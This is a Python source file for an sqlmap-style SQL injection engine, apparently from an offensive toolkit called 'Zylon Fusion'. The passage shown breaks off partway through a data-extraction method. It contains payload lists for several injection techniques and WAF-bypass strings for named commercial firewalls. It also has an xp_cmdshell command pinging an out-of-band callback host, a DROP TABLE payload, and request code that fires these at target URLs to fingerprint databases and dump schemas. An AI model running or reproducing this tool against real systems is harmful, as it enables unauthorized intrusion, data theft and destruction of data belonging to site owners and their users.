#!/usr/bin/env python3
"""
ZYLON FUSION - SQLMap Enhancement Engine
Fused from: sqlmapproject/sqlmap + Custom Zylon Techniques
Capabilities:
  - SQLi detection with 6 techniques (boolean blind, time blind, error-based, UNION, stacked, inline)
  - Database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - Data extraction (databases, tables, columns, rows)
  - DIOS (Dump In One Shot) capability
  - WAF detection and bypass payloads
  - Tamper script engine (space2comment, between, charencode, randomcase, etc.)
  - Batch mode for automated exploitation
  - HTTP methods: GET, POST, cookie, header, user-agent injection
  - Timeout and retry handling
  - Pure Python - no sqlmap binary dependency
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import random
import string
import urllib.parse
import hashlib
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
from core.var import USER_AGENTS

# ============================================================================
# ANSI COLOR CODES
# ============================================================================

R = '\033[91m'    # Red
G = '\033[92m'    # Green
Y = '\033[93m'    # Yellow
C = '\033[96m'    # Cyan
W = '\033[97m'    # White
B = '\033[94m'    # Blue
M = '\033[95m'    # Magenta
BD = '\033[1m'    # Bold
RS = '\033[0m'    # Reset

# ============================================================================
# SQLI TECHNIQUE DEFINITIONS
# ============================================================================

TECH_BOOLEAN_BLIND = "boolean_blind"
TECH_TIME_BLIND = "time_blind"
TECH_ERROR_BASED = "error_based"
TECH_UNION = "union"
TECH_STACKED = "stacked"
TECH_INLINE = "inline"

ALL_TECHNIQUES = [
    TECH_BOOLEAN_BLIND, TECH_TIME_BLIND, TECH_ERROR_BASED,
    TECH_UNION, TECH_STACKED, TECH_INLINE
]

# ============================================================================
# DATABASE FINGERPRINT SIGNATURES
# ============================================================================

DB_FINGERPRINTS = {
    "MySQL": {
        "error_patterns": [
            r"You have an error in your SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"mysql_fetch",
            r"mysql_num_rows",
        ],
        "boolean_true": "' OR '1'='1",
        "boolean_false": "' OR '1'='2",
        "time_payload": "' AND SLEEP({delay})-- -",
        "version_query": "' UNION SELECT @@version-- -",
        "version_pattern": r"(\d+\.\d+\.\d+[-\w]*)",
        "comment_syntax": "-- -",
        "concat_func": "CONCAT({},{})",
        "substr_func": "SUBSTRING({},{},{})",
        "length_func": "LENGTH({})",
    },
    "PostgreSQL": {
        "error_patterns": [
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"postgresql\.util\.PSQLException",
            r"org\.postgresql\.util",
            r"pg_query",
        ],
        "boolean_true": "' OR '1'='1",
        "boolean_false": "' OR '1'='2",
        "time_payload": "' AND PG_SLEEP({delay})-- -",
        "version_query": "' UNION SELECT version()-- -",
        "version_pattern": r"PostgreSQL (\d+\.\d+)",
        "comment_syntax": "-- -",
        "concat_func": "{0}||{1}",
        "substr_func": "SUBSTRING({},{},{})",
        "length_func": "LENGTH({})",
    },
    "MSSQL": {
        "error_patterns": [
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SqlException",
            r"System\.Data\.SqlClient",
            r"Unclosed quotation mark after the character string",
            r"SQL Server.*Error",
        ],
        "boolean_true": "' OR '1'='1",
        "boolean_false": "' OR '1'='2",
        "time_payload": "' WAITFOR DELAY '0:0:{delay}'-- -",
        "version_query": "' UNION SELECT @@version-- -",
        "version_pattern": r"Microsoft SQL Server.*?(\d+\.\d+\.\d+)",
        "comment_syntax": "-- -",
        "concat_func": "{0}+{1}",
        "substr_func": "SUBSTRING({},{},{})",
        "length_func": "LEN({})",
    },
    "Oracle": {
        "error_patterns": [
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"oracle\.jdbc",
            r"java\.sql\.SQLException.*ORA-",
        ],
        "boolean_true": "' OR '1'='1",
        "boolean_false": "' OR '1'='2",
        "time_payload": "' AND DBMS_LOCK.SLEEP({delay})-- -",
        "version_query": "' UNION SELECT banner FROM v$version WHERE rownum=1-- -",
        "version_pattern": r"Oracle.*?(\d+[cg]\d+)",
        "comment_syntax": "-- -",
        "concat_func": "{0}||{1}",
        "substr_func": "SUBSTR({},{},{})",
        "length_func": "LENGTH({})",
    },
    "SQLite": {
        "error_patterns": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"SQLITE_ERROR",
            r"sqlite_query",
            r"unrecognized token",
            r"sqlite_",
        ],
        "boolean_true": "' OR '1'='1",
        "boolean_false": "' OR '1'='2",
        "time_payload": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))-- -",
        "version_query": "' UNION SELECT sqlite_version()-- -",
        "version_pattern": r"(\d+\.\d+\.\d+)",
        "comment_syntax": "-- -",
        "concat_func": "{0}||{1}",
        "substr_func": "SUBSTR({},{},{})",
        "length_func": "LENGTH({})",
    },
}

# ============================================================================
# SQLI PAYLOAD DATABASE
# ============================================================================

BOOLEAN_BLIND_PAYLOADS = {
    "true_conditions": [
        "' OR '1'='1",
        "' OR 1=1-- -",
        "' OR '1'='1'-- -",
        "') OR ('1'='1",
        "') OR ('1'='1'-- -",
        "' OR 1=1#",
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "1) OR 1=1-- -",
        "' OR 'x'='x",
    ],
    "false_conditions": [
        "' OR '1'='2",
        "' AND '1'='2",
        "' AND 1=2-- -",
        "') AND ('1'='2",
        "1' AND '1'='2",
        "1' AND 1=2-- -",
    ],
}

TIME_BLIND_PAYLOADS = [
    "' AND SLEEP({delay})-- -",
    "' AND SLEEP({delay})#",
    "') AND SLEEP({delay})-- -",
    "'; WAITFOR DELAY '0:0:{delay}'-- -",
    "' AND PG_SLEEP({delay})-- -",
    "1' AND SLEEP({delay})-- -",
    "1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
    "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
    "' OR SLEEP({delay})-- -",
    "1; SELECT SLEEP({delay})-- -",
    "' AND BENCHMARK({iterations},MD5('test'))-- -",
    "' AND DBMS_LOCK.SLEEP({delay})-- -",
]

ERROR_BASED_PAYLOADS = [
    "'",
    '"',
    "')",
    "'))",
    "')-- -",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
    "' OR 1=CAST((SELECT version()) AS int)-- -",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]

UNION_PAYLOADS_TEMPLATE = [
    "' UNION SELECT {cols}-- -",
    "' UNION ALL SELECT {cols}-- -",
    "') UNION SELECT {cols}-- -",
    "')) UNION SELECT {cols}-- -",
    "' UNION SELECT {cols}#",
    "%27 UNION SELECT {cols}-- -",
    "' UnIoN SeLeCt {cols}-- -",
]

STACKED_PAYLOADS = [
    "'; SELECT 1-- -",
    "'; SELECT SLEEP(1)-- -",
    "'; WAITFOR DELAY '0:0:1'-- -",
    "'; EXEC master..xp_cmdshell 'ping {oob_host}'-- -",
    "'; SELECT pg_sleep(1)-- -",
    "1; SELECT 1-- -",
    "1; DROP TABLE test_zylon-- -",
]

INLINE_PAYLOADS = [
    "1'/**/OR/**/1=1-- -",
    "1'/**/AND/**/1=1-- -",
    "1'/**/UNION/**/SELECT/**/1-- -",
    "1'/**/AND/**/SLEEP(1)-- -",
]

# ============================================================================
# WAF BYPASS PAYLOADS
# ============================================================================

WAF_BYPASS_PAYLOADS = {
    "Cloudflare": [
        "'/**/OR/**/1=1-- -",
        "'%20OR%201=1-- -",
        "' OR 1=1-- -a",
        "' /*!OR*/ 1=1-- -",
        "' OR(1)=(1)-- -",
    ],
    "ModSecurity": [
        "' /*!50000OR*/ /*!500001*/=/*!500001*/-- -",
        "' OR 1%3D1-- -",
        "' OORR 1=1-- -",
        "'/**/OR/**/1=1-- -",
        "' OR 1 LIKE 1-- -",
    ],
    "Imperva": [
        "' OR 1=1-- -",
        "'%20OR%201%3D1-- -",
        "' O%52 1=1-- -",
        "' OR%091=1-- -",
        "' OR%0A1=1-- -",
    ],
    "AWS WAF": [
        "' OR 1=1-- -",
        "'/**/OR/**/1=1-- -",
        "' OR 1%3D1-- -",
        "' /*!OR*/ 1=1-- -",
    ],
    "Generic": [
        "'/**/OR/**/1=1-- -",
        "' OR 1 LIKE 1-- -",
        "' OR '1' LIKE '1",
        "' /*!50000OR*/1=1-- -",
        "' OR 1%3D1-- -",
        "' OR(1)=(1)-- -",
        "'%20OR%091%3D1-- -",
        "' O%52 1=1-- -",
    ],
}

# ============================================================================
# TAMPER SCRIPT ENGINE
# ============================================================================

TAMPER_SCRIPTS = {
    "space2comment": lambda p: re.sub(r'\s+', '/**/', p),
    "between": lambda p: p.replace("=", " BETWEEN 0 AND "),
    "charencode": lambda p: urllib.parse.quote(p, safe=""),
    "randomcase": lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
    "space2plus": lambda p: re.sub(r'\s+', '+', p),
    "space2dash": lambda p: re.sub(r'\s+', '%0d%0a-- -%0d%0a', p),
    "space2mssqlblank": lambda p: re.sub(r'\s+', '%01', p),
    "between_and": lambda p: p.replace("AND", "BETWEEN 0 AND"),
    "percentage": lambda p: re.sub(r'([A-Za-z])', lambda m: f'%{m.group(1)}', p),
    "uppercase": lambda p: p.upper(),
    "lowercase": lambda p: p.lower(),
    "appendnull": lambda p: p + '%00',
    "base64encode": lambda p: urllib.parse.quote(__import__('base64').b64encode(p.encode()).decode()),
    "hexencode": lambda p: ''.join(f'%{ord(c):02x}' for c in p),
    "unmagicquotes": lambda p: p.replace("'", "\\\xbf'"),
    "equaltolike": lambda p: p.replace("=", " LIKE "),
    "space2tab": lambda p: re.sub(r'\s+', '%09', p),
    "space2newline": lambda p: re.sub(r'\s+', '%0a', p),
}

# ============================================================================
# SQLI ERROR SIGNATURES (Extended)
# ============================================================================

SQLI_ERROR_SIGNATURES = [
    r"You have an error in your SQL syntax",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_",
    r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
    r"System\.Data\.SqlClient\.",
    r"(?s)Exception.*\WRNOpenRecordset",
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_",
    r"Warning.*ora_",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"Access Database Engine",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"SQLITE_ERROR",
    r"SQLITE_CONSTRAINT",
    r"Microsoft OLE DB Provider",
    r"Unclosed quotation mark",
    r"SQL command not properly ended",
    r"Syntax error.*SQL",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"pg_query",
    r"pg_exec",
    r"sqlite_query",
]


class SQLMapEngine:
    """
    SQLMap Enhancement Engine - Pure Python SQLi Detection & Exploitation
    Implements sqlmap-style scanning without external binary dependency.
    """

    def __init__(self, session=None, timeout=10, retries=3, threads=5,
                 delay=0, verbose=True, tamper=None, proxy=None):
        self.session = session or shared_session
        self.timeout = timeout
        self.retries = retries
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.tamper = tamper or []
        self.findings = []
        self.db_type = None
        self.waf_type = None
        self.time_delay = 5  # seconds for time-based detection
        self._original_response = None
        self._original_length = 0
        self._original_status = 0

    def _log(self, msg, level="info"):
        """Print colored log message"""
        colors = {
            "info": C, "success": G, "warning": Y,
            "error": R, "critical": R, "payload": M
        }
        color = colors.get(level, W)
        prefix = {
            "info": "*", "success": "+", "warning": "!",
            "error": "-", "critical": "!!!", "payload": ">"
        }.get(level, "*")
        if self.verbose:
            print(f"  {color}[{prefix}]{RS} {msg}")

    def _apply_tamper(self, payload):
        """Apply tamper scripts to payload"""
        for script in self.tamper:
            if script in TAMPER_SCRIPTS:
                try:
                    payload = TAMPER_SCRIPTS[script](payload)
                except Exception:
                    pass
        return payload

    def _send_request(self, url, param, payload, method='GET', data=None,
                      cookie=None, header=None, user_agent_inject=None, json_inject=False):
        """Send HTTP request with SQLi payload injected"""
        try:
            tampered = self._apply_tamper(payload)
            headers = {}
            cookies = {}
            req_data = data.copy() if data else {}

            # Injection point selection
            if cookie:
                cookies = {cookie: tampered}
            elif header:
                headers = {header: tampered}
            elif user_agent_inject:
                headers = {'User-Agent': tampered}
            elif json_inject:
                # JSON body injection via PayloadInjector
                injection = PayloadInjector.inject_json(url, param, tampered, method=method)
                headers.update(injection.get('headers', {}))
                for attempt in range(self.retries):
                    try:
                        resp = self.session.request(injection['method'], injection['url'],
                                                    json=injection['json'], headers=headers,
                                                    cookies=cookies, timeout=self.timeout,
                                                    allow_redirects=True)
                        if self.delay > 0:
                            time.sleep(self.delay)
                        return resp
                    except requests.exceptions.Timeout:
                        self._log(f"Timeout (attempt {attempt+1}/{self.retries})", "warning")
                        continue
                    except requests.exceptions.ConnectionError:
                        self._log(f"Connection error (attempt {attempt+1}/{self.retries})", "warning")
                        time.sleep(1)
                        continue
                return None
            elif method.upper() == 'POST':
                req_data[param] = tampered
            else:
                # GET method
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}{param}={urllib.parse.quote(tampered, safe='')}"
                req_data = None

            for attempt in range(self.retries):
                try:
                    if method.upper() == 'POST':
                        resp = self.session.post(url, data=req_data, headers=headers,
                                                cookies=cookies, timeout=self.timeout,
                                                allow_redirects=True)
                    else:
                        resp = self.session.get(url, params=req_data, headers=headers,
                                               cookies=cookies, timeout=self.timeout,
                                               allow_redirects=True)
                    if self.delay > 0:
                        time.sleep(self.delay)
                    return resp
                except requests.exceptions.Timeout:
                    self._log(f"Timeout (attempt {attempt+1}/{self.retries})", "warning")
                    continue
                except requests.exceptions.ConnectionError:
                    self._log(f"Connection error (attempt {attempt+1}/{self.retries})", "warning")
                    time.sleep(1)
                    continue
            return None
        except Exception as e:
            self._log(f"Request error: {str(e)[:60]}", "error")
            return None

    def _get_baseline(self, url, param, method='GET'):
        """Get baseline response for comparison"""
        resp = self._send_request(url, param, "1", method=method)
        if resp:
            self._original_response = resp.text
            self._original_length = len(resp.text)
            self._original_status = resp.status_code
        return resp

    def _check_error_based(self, response):
        """Check response for SQL error messages"""
        if not response:
            return False, None
        text = response.text
        for pattern in SQLI_ERROR_SIGNATURES:
            match = regex_cache.search(pattern, text, re.IGNORECASE)
            if match:
                return True, match.group(0)
        return False, None

    def _check_boolean_blind(self, true_resp, false_resp):
        """Compare true/false condition responses for boolean blind detection"""
        if not true_resp or not false_resp:
            return False
        # If true response is similar to original but false is different
        true_len = len(true_resp.text)
        false_len = len(false_resp.text)
        orig_len = self._original_length

        # Length difference heuristic
        if abs(true_len - orig_len) < 50 and abs(false_len - orig_len) > 100:
            return True
        if abs(true_len - false_len) > 100:
            # True condition should be closer to original
            if abs(true_len - orig_len) < abs(false_len - orig_len):
                return True
        # Status code difference
        if true_resp.status_code == self._original_status and false_resp.status_code != self._original_status:
            return True
        # Content similarity
        if self._original_response:
            true_diff = sum(1 for a, b in zip(true_resp.text, self._original_response) if a != b)
            false_diff = sum(1 for a, b in zip(false_resp.text, self._original_response) if a != b)
            if false_diff > true_diff * 2 and true_diff < 50:
                return True
        return False

    # ========================================================================
    # METHOD: detect_sqli
    # ========================================================================

    def detect_sqli(self, url, param, method='GET'):
        """
        Detect SQL injection with all 6 techniques.
        Returns dict with detection results.
        """
        self._log(f"Starting SQLi detection on {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {},
            'scan_type': 'sqli_detection',
            'techniques_tested': [],
            'techniques_vulnerable': [],
        }

        # Get baseline response
        self._log("Acquiring baseline response...", "info")
        self._get_baseline(url, param, method)
        if not self._original_response:
            results['details']['error'] = 'Could not get baseline response'
            return results

        # Test each technique
        technique_results = {}

        # 1. Error-based detection
        self._log("Testing error-based SQLi...", "info")
        err_vuln, err_payloads = self._test_error_based(url, param, method)
        technique_results[TECH_ERROR_BASED] = err_vuln
        results['techniques_tested'].append(TECH_ERROR_BASED)
        if err_vuln:
            results['techniques_vulnerable'].append(TECH_ERROR_BASED)
            results['vulnerable'] = True
            results['findings'].extend(err_payloads)
            self._log(f"Error-based SQLi detected! ({len(err_payloads)} payloads)", "success")

        # 2. Boolean blind detection
        self._log("Testing boolean-based blind SQLi...", "info")
        bool_vuln, bool_payloads = self._test_boolean_blind(url, param, method)
        technique_results[TECH_BOOLEAN_BLIND] = bool_vuln
        results['techniques_tested'].append(TECH_BOOLEAN_BLIND)
        if bool_vuln:
            results['techniques_vulnerable'].append(TECH_BOOLEAN_BLIND)
            results['vulnerable'] = True
            results['findings'].extend(bool_payloads)
            self._log("Boolean-based blind SQLi detected!", "success")

        # 3. Time-based blind detection
        self._log("Testing time-based blind SQLi...", "info")
        time_vuln, time_payloads = self._test_time_blind(url, param, method)
        technique_results[TECH_TIME_BLIND] = time_vuln
        results['techniques_tested'].append(TECH_TIME_BLIND)
        if time_vuln:
            results['techniques_vulnerable'].append(TECH_TIME_BLIND)
            results['vulnerable'] = True
            results['findings'].extend(time_payloads)
            self._log("Time-based blind SQLi detected!", "success")

        # 4. UNION-based detection
        self._log("Testing UNION-based SQLi...", "info")
        union_vuln, union_payloads, union_cols = self._test_union(url, param, method)
        technique_results[TECH_UNION] = union_vuln
        results['techniques_tested'].append(TECH_UNION)
        if union_vuln:
            results['techniques_vulnerable'].append(TECH_UNION)
            results['vulnerable'] = True
            results['findings'].extend(union_payloads)
            results['details']['union_columns'] = union_cols
            self._log(f"UNION-based SQLi detected! ({union_cols} columns)", "success")

        # 5. Stacked queries
        self._log("Testing stacked queries SQLi...", "info")
        stack_vuln, stack_payloads = self._test_stacked(url, param, method)
        technique_results[TECH_STACKED] = stack_vuln
        results['techniques_tested'].append(TECH_STACKED)
        if stack_vuln:
            results['techniques_vulnerable'].append(TECH_STACKED)
            results['vulnerable'] = True
            results['findings'].extend(stack_payloads)
            self._log("Stacked queries SQLi detected!", "success")

        # 6. Inline queries
        self._log("Testing inline query SQLi...", "info")
        inline_vuln, inline_payloads = self._test_inline(url, param, method)
        technique_results[TECH_INLINE] = inline_vuln
        results['techniques_tested'].append(TECH_INLINE)
        if inline_vuln:
            results['techniques_vulnerable'].append(TECH_INLINE)
            results['vulnerable'] = True
            results['findings'].extend(inline_payloads)
            self._log("Inline query SQLi detected!", "success")

        # 7. JSON body injection (test if only GET/POST form was used)
        if method.upper() in ('GET', 'POST'):
            self._log("Testing JSON body injection SQLi...", "info")
            json_vuln, json_payloads = self._test_json_injection(url, param, method)
            technique_results['json_inject'] = json_vuln
            results['techniques_tested'].append('json_inject')
            if json_vuln:
                results['techniques_vulnerable'].append('json_inject')
                results['vulnerable'] = True
                results['findings'].extend(json_payloads)
                self._log("JSON body injection SQLi detected!", "success")

        results['details']['technique_results'] = technique_results
        results['details']['waf_detected'] = self.waf_type

        if results['vulnerable']:
            self._log(f"{G}SQLi CONFIRMED via: {', '.join(results['techniques_vulnerable'])}{RS}", "success")
        else:
            self._log("No SQLi vulnerability detected", "warning")

        return results

    def _test_error_based(self, url, param, method):
        """Test for error-based SQLi"""
        vulnerable = False
        findings = []
        for payload in ERROR_BASED_PAYLOADS:
            resp = self._send_request(url, param, payload, method=method)
            if resp:
                is_sqli, error_msg = self._check_error_based(resp)
                if is_sqli:
                    vulnerable = True
                    findings.append({
                        'technique': TECH_ERROR_BASED,
                        'payload': payload,
                        'evidence': error_msg[:100],
                        'param': param,
                    })
                    # Try to identify DB type from error
                    self._fingerprint_from_error(error_msg)
                    break  # One error-based hit is enough
        return vulnerable, findings

    def _test_boolean_blind(self, url, param, method):
        """Test for boolean-based blind SQLi"""
        vulnerable = False
        findings = []

        for i, true_payload in enumerate(BOOLEAN_BLIND_PAYLOADS["true_conditions"]):
            if i >= len(BOOLEAN_BLIND_PAYLOADS["false_conditions"]):
                false_payload = BOOLEAN_BLIND_PAYLOADS["false_conditions"][-1]
            else:
                false_payload = BOOLEAN_BLIND_PAYLOADS["false_conditions"][i]

            true_resp = self._send_request(url, param, true_payload, method=method)
            false_resp = self._send_request(url, param, false_payload, method=method)

            if self._check_boolean_blind(true_resp, false_resp):
                vulnerable = True
                findings.append({
                    'technique': TECH_BOOLEAN_BLIND,
                    'payload': true_payload,
                    'evidence': f"True: {len(true_resp.text) if true_resp else 0}B / False: {len(false_resp.text) if false_resp else 0}B / Baseline: {self._original_length}B",
                    'param': param,
                })
                break
        return vulnerable, findings

    def _test_time_blind(self, url, param, method):
        """Test for time-based blind SQLi"""
        vulnerable = False
        findings = []
        delay = self.time_delay

        for payload_template in TIME_BLIND_PAYLOADS:
            payload = payload_template.format(delay=delay, iterations=delay * 1000000)
            start = time.time()
            resp = self._send_request(url, param, payload, method=method)
            elapsed = time.time() - start

            if elapsed >= (delay - 1):  # Allow 1s margin
                vulnerable = True
                findings.append({
                    'technique': TECH_TIME_BLIND,
                    'payload': payload,
                    'evidence': f"Response delay: {elapsed:.2f}s (expected: {delay}s)",
                    'param': param,
                })
                break
        return vulnerable, findings

    def _test_union(self, url, param, method):
        """Test for UNION-based SQLi and determine column count"""
        vulnerable = False
        findings = []
        num_cols = 0

        # Determine number of columns using ORDER BY
        for cols in range(1, 30):
            payload = f"' ORDER BY {cols}-- -"
            resp = self._send_request(url, param, payload, method=method)
            if resp:
                is_err, err_msg = self._check_error_based(resp)
                if is_err or resp.status_code != self._original_status:
                    num_cols = cols - 1
                    break
                if cols == 29:
                    num_cols = 20  # Assume 20 if we get this far

        if num_cols > 0:
            # Build UNION SELECT payload
            col_placeholder = ",".join(["NULL"] * num_cols)
            for template in UNION_PAYLOADS_TEMPLATE:
                payload = template.format(cols=col_placeholder)
                resp = self._send_request(url, param, payload, method=method)
                if resp:
                    # UNION works if response is different from baseline
                    if len(resp.text) != self._original_length and resp.status_code == 200:
                        is_err, _ = self._check_error_based(resp)
                        if not is_err:
                            vulnerable = True
                            findings.append({
                                'technique': TECH_UNION,
                                'payload': payload[:120],
                                'evidence': f"UNION with {num_cols} columns, response differs from baseline",
                                'param': param,
                            })
                            break
        return vulnerable, findings, num_cols

    def _test_stacked(self, url, param, method):
        """Test for stacked query SQLi"""
        vulnerable = False
        findings = []

        # Generate OOB callback host for payloads that reference {oob_host}
        oob_host = oob_provider.get_callback_domain(oob_provider.generate_payload_id())

        for payload_template in STACKED_PAYLOADS:
            try:
                payload = payload_template.format(oob_host=oob_host)
            except (KeyError, IndexError):
                payload = payload_template
            start = time.time()
            resp = self._send_request(url, param, payload, method=method)
            elapsed = time.time() - start

            # Stacked queries may succeed silently or cause time delay
            if resp and resp.status_code != self._original_status:
                vulnerable = True
                findings.append({
                    'technique': TECH_STACKED,
                    'payload': payload,
                    'evidence': f"Status changed: {self._original_status} -> {resp.status_code}",
                    'param': param,
                })
                break
            elif elapsed >= 1.5:
                vulnerable = True
                findings.append({
                    'technique': TECH_STACKED,
                    'payload': payload,
                    'evidence': f"Time delay: {elapsed:.2f}s",
                    'param': param,
                })
                break
        return vulnerable, findings

    def _test_inline(self, url, param, method):
        """Test for inline query SQLi"""
        vulnerable = False
        findings = []

        for payload in INLINE_PAYLOADS:
            resp = self._send_request(url, param, payload, method=method)
            if resp:
                is_err, err_msg = self._check_error_based(resp)
                if is_err:
                    vulnerable = True
                    findings.append({
                        'technique': TECH_INLINE,
                        'payload': payload,
                        'evidence': err_msg[:100],
                        'param': param,
                    })
                    break
                if abs(len(resp.text) - self._original_length) > 100:
                    vulnerable = True
                    findings.append({
                        'technique': TECH_INLINE,
                        'payload': payload,
                        'evidence': f"Response length diff: {len(resp.text)} vs {self._original_length}",
                        'param': param,
                    })
                    break
        return vulnerable, findings

    def _test_json_injection(self, url, param, method='POST'):
        """Test for SQLi via JSON body injection using PayloadInjector"""
        vulnerable = False
        findings = []
        for payload in ERROR_BASED_PAYLOADS[:5]:
            resp = self._send_request(url, param, payload, method=method, json_inject=True)
            if resp:
                is_sqli, error_msg = self._check_error_based(resp)
                if is_sqli:
                    vulnerable = True
                    findings.append({
                        'technique': 'json_inject',
                        'payload': payload,
                        'evidence': error_msg[:100],
                        'param': param,
                    })
                    self._fingerprint_from_error(error_msg)
                    break
        if not vulnerable:
            for payload in BOOLEAN_BLIND_PAYLOADS["true_conditions"][:3]:
                true_resp = self._send_request(url, param, payload, method=method, json_inject=True)
                false_resp = self._send_request(url, param,
                    BOOLEAN_BLIND_PAYLOADS["false_conditions"][0], method=method, json_inject=True)
                if self._check_boolean_blind(true_resp, false_resp):
                    vulnerable = True
                    findings.append({
                        'technique': 'json_inject',
                        'payload': payload,
                        'evidence': f"Boolean blind via JSON: True={len(true_resp.text) if true_resp else 0}B / False={len(false_resp.text) if false_resp else 0}B",
                        'param': param,
                    })
                    break
        return vulnerable, findings

    def _fingerprint_from_error(self, error_msg):
        """Identify database type from error message"""
        for db_name, db_info in DB_FINGERPRINTS.items():
            for pattern in db_info["error_patterns"]:
                if regex_cache.search(pattern, error_msg, re.IGNORECASE):
                    self.db_type = db_name
                    self._log(f"Database identified: {db_name}", "success")
                    return

    # ========================================================================
    # METHOD: fingerprint_db
    # ========================================================================

    def fingerprint_db(self, url, param):
        """
        Identify database type through multiple fingerprinting techniques.
        Returns dict with database identification results.
        """
        self._log(f"Fingerprinting database at {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'db_type': None,
                'db_version': None,
                'fingerprint_methods': [],
            },
            'scan_type': 'db_fingerprint',
        }

        # First, try error-based fingerprinting
        for payload in ERROR_BASED_PAYLOADS[:5]:
            resp = self._send_request(url, param, payload, method='GET')
            if resp:
                is_err, err_msg = self._check_error_based(resp)
                if is_err:
                    self._fingerprint_from_error(err_msg)
                    results['details']['fingerprint_methods'].append('error_based')
                    if self.db_type:
                        results['details']['db_type'] = self.db_type
                        results['findings'].append({
                            'type': 'db_fingerprint',
                            'method': 'error_based',
                            'db_type': self.db_type,
                            'evidence': err_msg[:100],
                        })

        # Try version-specific queries
        for db_name, db_info in DB_FINGERPRINTS.items():
            version_payload = db_info['version_query']
            resp = self._send_request(url, param, version_payload, method='GET')
            if resp:
                version_match = regex_cache.search(db_info['version_pattern'], resp.text, re.IGNORECASE)
                if version_match:
                    results['details']['db_type'] = db_name
                    results['details']['db_version'] = version_match.group(1)
                    results['details']['fingerprint_methods'].append('version_query')
                    results['findings'].append({
                        'type': 'db_version',
                        'method': 'version_query',
                        'db_type': db_name,
                        'version': version_match.group(1),
                    })
                    self.db_type = db_name
                    break

        # Try time-based fingerprinting
        if not self.db_type:
            for db_name, db_info in DB_FINGERPRINTS.items():
                time_payload = db_info['time_payload'].format(delay=3)
                start = time.time()
                resp = self._send_request(url, param, time_payload, method='GET')
                elapsed = time.time() - start
                if elapsed >= 2:
                    self.db_type = db_name
                    results['details']['db_type'] = db_name
                    results['details']['fingerprint_methods'].append('time_based')
                    results['findings'].append({
                        'type': 'db_fingerprint',
                        'method': 'time_based',
                        'db_type': db_name,
                        'evidence': f"Time delay: {elapsed:.2f}s with {db_name} payload",
                    })
                    break

        # Try boolean-based fingerprinting
        if not self.db_type:
            # MySQL specific
            resp = self._send_request(url, param, "' AND @@version IS NOT NULL-- -", method='GET')
            if resp and resp.status_code == self._original_status:
                self.db_type = "MySQL"
                results['details']['db_type'] = "MySQL"
                results['details']['fingerprint_methods'].append('boolean_fingerprint')
            else:
                # PostgreSQL specific
                resp = self._send_request(url, param, "' AND version() IS NOT NULL-- -", method='GET')
                if resp and resp.status_code == self._original_status:
                    self.db_type = "PostgreSQL"
                    results['details']['db_type'] = "PostgreSQL"
                    results['details']['fingerprint_methods'].append('boolean_fingerprint')

        if self.db_type:
            results['vulnerable'] = True
            self._log(f"Database fingerprint: {self.db_type}", "success")
        else:
            self._log("Could not determine database type", "warning")

        return results

    # ========================================================================
    # METHOD: extract_data
    # ========================================================================

    def extract_data(self, url, param, db_type=None):
        """
        Extract databases, tables, columns from the target.
        Returns dict with extracted data.
        """
        self._log(f"Extracting data from {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'databases': [],
                'tables': {},
                'columns': {},
                'rows': {},
            },
            'scan_type': 'data_extraction',
        }

        db = db_type or self.db_type or "MySQL"
        self._log(f"Using extraction queries for: {db}", "info")

        # Get baseline
        self._get_baseline(url, param, method='GET')

        # Step 1: Extract database names
        db_queries = {
            "MySQL": "' UNION SELECT schema_name FROM information_schema.schemata-- -",
            "PostgreSQL": "' UNION SELECT schema_name FROM information_schema.schemata-- -",
            "MSSQL": "' UNION SELECT name FROM sys.databases-- -",
            "Oracle": "' UNION SELECT owner FROM all_tables GROUP BY owner-- -",
            "SQLite": "' UNION SELECT 'main'-- -",
        }

        db_query = db_queries.get(db, db_queries["MySQL"])
        resp = self._send_request(url, param, db_query, method='GET')
        if resp and len(resp.text) != self._original_length:
            # Parse out database names (heuristic - look for new content)
            new_content = resp.text.replace(self._original_response, "")
